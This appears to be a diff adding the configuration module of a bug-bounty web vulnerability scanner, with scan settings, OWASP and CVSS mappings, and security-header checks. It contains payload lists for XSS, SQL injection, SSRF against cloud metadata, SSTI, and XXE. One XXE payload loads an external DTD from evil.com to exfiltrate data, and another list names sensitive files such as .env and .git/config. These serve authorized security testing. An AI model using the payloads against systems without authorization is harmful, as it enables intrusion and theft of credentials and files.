@@ -1,0 +1,364 @@
+"""
+Configuration settings for the Pentest Scanner.
+"""
+
+import os
+from dataclasses import dataclass, field
+from typing import List, Dict, Optional
+from pathlib import Path
+
+@dataclass
+class ScannerConfig:
+    """Global scanner configuration."""
+    # Target settings
+    target_url: str = ""
+    target_domain: str = ""
+    
+    # Scan settings
+    scan_depth: int = 3  # 1=passive only, 2=passive+light active, 3=full scan
+    max_threads: int = 10
+    request_timeout: int = 30
+    max_redirects: int = 5
+    
+    # Rate limiting
+    requests_per_second: float = 5.0
+    concurrent_requests: int = 5
+    
+    # User agent
+    user_agent: str = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    
+    # Output settings
+    output_dir: Path = Path("/opt/data/pentest_scanner/reports")
+    report_format: List[str] = field(default_factory=lambda: ["markdown", "json", "html"])
+    
+    # Module toggles
+    enable_passive_recon: bool = True
+    enable_active_scan: bool = True
+    enable_browser_tests: bool = True
+    enable_ssl_checks: bool = True
+    enable_cors_checks: bool = True
+    enable_csp_checks: bool = True
+    enable_cookie_checks: bool = True
+    enable_xss_checks: bool = True
+    enable_sqli_checks: bool = True
+    enable_ssrf_checks: bool = True
+    enable_idor_checks: bool = True
+    enable_open_redirect_checks: bool = True
+    enable_xxe_checks: bool = True
+    enable_ssti_checks: bool = True
+    enable_file_upload_checks: bool = True
+    enable_broken_auth_checks: bool = True
+    enable_sensitive_data_checks: bool = True
+    
+    # Authentication (for authenticated scans)
+    auth_cookies: Dict[str, str] = field(default_factory=dict)
+    auth_headers: Dict[str, str] = field(default_factory=dict)
+    auth_bearer_token: str = ""
+    
+    # Exclusions
+    excluded_paths: List[str] = field(default_factory=lambda: [
+        "/logout", "/signout", "/delete", "/remove", "/destroy",
+        "/admin/delete", "/admin/remove"
+    ])
+    excluded_domains: List[str] = field(default_factory=list)
+    
+    # Bug bounty specific
+    bug_bounty_mode: bool = True
+    include_poc: bool = True
+    include_cvss: bool = True
+    include_remediation: bool = True
+    include_references: bool = True
+    
+    # Custom headers
+    custom_headers: Dict[str, str] = field(default_factory=dict)
+    
+    # Proxy settings
+    proxy_url: Optional[str] = None
+    proxy_auth: Optional[str] = None
+    
+    # WAF evasion
+    waf_evasion: bool = False
+    evasion_techniques: List[str] = field(default_factory=list)
+    
+    def __post_init__(self):
+        """Post-initialization validation and setup."""
+        if self.target_url and not self.target_domain:
+            from urllib.parse import urlparse
+            parsed = urlparse(self.target_url)
+            self.target_domain = parsed.netloc
+        
+        self.output_dir.mkdir(parents=True, exist_ok=True)
+
+
+# Default configuration instance
+DEFAULT_CONFIG = ScannerConfig()
+
+# Vulnerability severity mapping for CVSS scoring
+SEVERITY_CVSS_MAP = {
+    "critical": {"base_score": 9.0, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"},
+    "high": {"base_score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
+    "medium": {"base_score": 5.0, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"},
+    "low": {"base_score": 2.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"},
+    "info": {"base_score": 0.0, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"},
+}
+
+# OWASP Top 10 2021 mapping
+OWASP_TOP_10_2021 = {
+    "A01": "Broken Access Control",
+    "A02": "Cryptographic Failures",
+    "A03": "Injection",
+    "A04": "Insecure Design",
+    "A05": "Security Misconfiguration",
+    "A06": "Vulnerable and Outdated Components",
+    "A07": "Identification and Authentication Failures",
+    "A08": "Software and Data Integrity Failures",
+    "A09": "Security Logging and Monitoring Failures",
+    "A10": "Server-Side Request Forgery (SSRF)",
+}
+
+# Common ports for service enumeration
+COMMON_PORTS = {
+    21: "FTP",
+    22: "SSH",
+    23: "Telnet",
+    25: "SMTP",
+    53: "DNS",
+    80: "HTTP",
+    110: "POP3",
+    143: "IMAP",
+    443: "HTTPS",
+    465: "SMTPS",
+    587: "SMTP Submission",
+    993: "IMAPS",
+    995: "POP3S",
+    1433: "MSSQL",
+    3306: "MySQL",
+    3389: "RDP",
+    5432: "PostgreSQL",
+    5900: "VNC",
+    6379: "Redis",
+    8080: "HTTP Proxy",
+    8443: "HTTPS Alt",
+    27017: "MongoDB",
+}
+
+# Default headers for requests
+DEFAULT_HEADERS = {
+    "User-Agent": DEFAULT_CONFIG.user_agent,
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate",
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "none",
+    "Sec-Fetch-User": "?1",
+    "Cache-Control": "max-age=0",
+}
+
+# XSS payloads for testing
+XSS_PAYLOADS = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<body onload=alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>",
+    "<select onfocus=alert('XSS') autofocus>",
+    "<textarea onfocus=alert('XSS') autofocus>",
+    "<keygen onfocus=alert('XSS') autofocus>",
+    "<video><source onerror=alert('XSS')>",
+    "<details open ontoggle=alert('XSS')>",
+    "<audio src onerror=alert('XSS')>",
+    "'\"><script>alert('XSS')</script>",
+    "\"><script>alert('XSS')</script>",
+    "';alert('XSS');//",
+    "\";alert('XSS');//",
+    "<script>confirm('XSS')</script>",
+    "<script>prompt('XSS')</script>",
+    "<img src=\"javascript:alert('XSS')\">",
+    "<svg><script>alert('XSS')</script></svg>",
+]
+
+# SQL Injection payloads
+SQLI_PAYLOADS = [
+    "'",
+    "\"",
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' OR '1'='1' --",
+    "\" OR \"1\"=\"1\" --",
+    "' OR '1'='1' /*",
+    "admin'--",
+    "admin' #",
+    "admin'/*",
+    "' OR 1=1--",
+    "\" OR 1=1--",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 2--",
+    "1' ORDER BY 3--",
+    "1' ORDER BY 4--",
+    "1' ORDER BY 5--",
+    "'; WAITFOR DELAY '0:0:5'--",
+    "'; SELECT pg_sleep(5)--",
+    "' OR SLEEP(5)--",
+    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+]
+
+# SSRF payloads
+SSRF_PAYLOADS = [
+    "http://localhost",
+    "http://127.0.0.1",
+    "http://0.0.0.0",
+    "http://[::1]",
+    "http://localhost:80",
+    "http://127.0.0.1:80",
+    "http://169.254.169.254",  # AWS metadata
+    "http://metadata.google.internal",  # GCP metadata
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "file:///etc/passwd",
+    "file:///etc/hosts",
+    "file:///proc/self/environ",
+    "dict://localhost:11211/stat",  # Memcached
+    "gopher://127.0.0.1:6379/_INFO",  # Redis
+    "http://localhost:22",  # SSH
+    "http://localhost:3306",  # MySQL
+]
+
+# Open redirect payloads
+OPEN_REDIRECT_PAYLOADS = [
+    "https://evil.com",
+    "//evil.com",
+    "///evil.com",
+    "////evil.com",
+    "https://evil.com@target.com",
+    "https://target.com@evil.com",
+    "/\\evil.com",
+    "/%5Cevil.com",
+    "javascript:alert(document.domain)",
+    "data:text/html,<script>alert('XSS')</script>",
+]
+
+# SSTI payloads
+SSTI_PAYLOADS = [
+    "{{7*7}}",
+    "{{7*'7'}}",
+    "{{config}}",
+    "{{self}}",
+    "{{request}}",
+    "{{session}}",
+    "{{g}}",
+    "{{''.__class__.__mro__[2].__subclasses__()}}",
+    "${7*7}",
+    "#{7*7}",
+    "@{7*7}",
+    "<%= 7*7 %>",
+    "<%= 7*7 %>",
+]
+
+# XXE payloads
+XXE_PAYLOADS = [
+    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
+    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>""",
+    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
+    """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><data>&send;</data>""",
+]
+
+# Common sensitive files to check
+SENSITIVE_FILES = [
+    "/.git/config",
+    "/.git/HEAD",
+    "/.env",
+    "/.env.production",
+    "/.env.local",
+    "/.env.development",
+    "/config.json",
+    "/config.yaml",
+    "/config.yml",
+    "/web.config",
+    "/wp-config.php",
+    "/config.php",
+    "/settings.py",
+    "/.htaccess",
+    "/.htpasswd",
+    "/robots.txt",
+    "/sitemap.xml",
+    "/crossdomain.xml",
+    "/clientaccesspolicy.xml",
+    "/.well-known/security.txt",
+    "/phpinfo.php",
+    "/info.php",
+    "/test.php",
+    "/backup.zip",
+    "/backup.tar.gz",
+    "/dump.sql",
+    "/database.sql",
+    "/composer.json",
+    "/package.json",
+    "/yarn.lock",
+    "/package-lock.json",
+    "/Gemfile",
+    "/Gemfile.lock",
+    "/requirements.txt",
+    "/Pipfile",
+    "/Pipfile.lock",
+]
+
+# Security headers to check
+SECURITY_HEADERS = {
+    "Strict-Transport-Security": {
+        "required": True,
+        "description": "Enforces HTTPS",
+        "recommendation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'"
+    },
+    "Content-Security-Policy": {
+        "required": True,
+        "description": "Prevents XSS and data injection",
+        "recommendation": "Implement a restrictive CSP policy"
+    },
+    "X-Frame-Options": {
+        "required": True,
+        "description": "Prevents clickjacking",
+        "recommendation": "Set to 'DENY' or 'SAMEORIGIN'"
+    },
+    "X-Content-Type-Options": {
+        "required": True,
+        "description": "Prevents MIME sniffing",
+        "recommendation": "Set to 'nosniff'"
+    },
+    "X-XSS-Protection": {
+        "required": False,
+        "description": "Legacy XSS protection",
+        "recommendation": "Set to '1; mode=block' (though CSP is preferred)"
+    },
+    "Referrer-Policy": {
+        "required": True,
+        "description": "Controls referrer information",
+        "recommendation": "Set to 'strict-origin-when-cross-origin' or 'no-referrer'"
+    },
+    "Permissions-Policy": {
+        "required": False,
+        "description": "Controls browser features",
+        "recommendation": "Define a restrictive permissions policy"
+    },
+    "Cross-Origin-Embedder-Policy": {
+        "required": False,
+        "description": "Controls cross-origin embedding",
+        "recommendation": "Set to 'require-corp'"
+    },
+    "Cross-Origin-Opener-Policy": {
+        "required": False,
+        "description": "Controls cross-origin window access",
+        "recommendation": "Set to 'same-origin'"
+    },
+    "Cross-Origin-Resource-Policy": {
+        "required": False,
+        "description": "Controls cross-origin resource loading",
+        "recommendation": "Set to 'same-origin' or 'cross-origin'"
+    },
+}
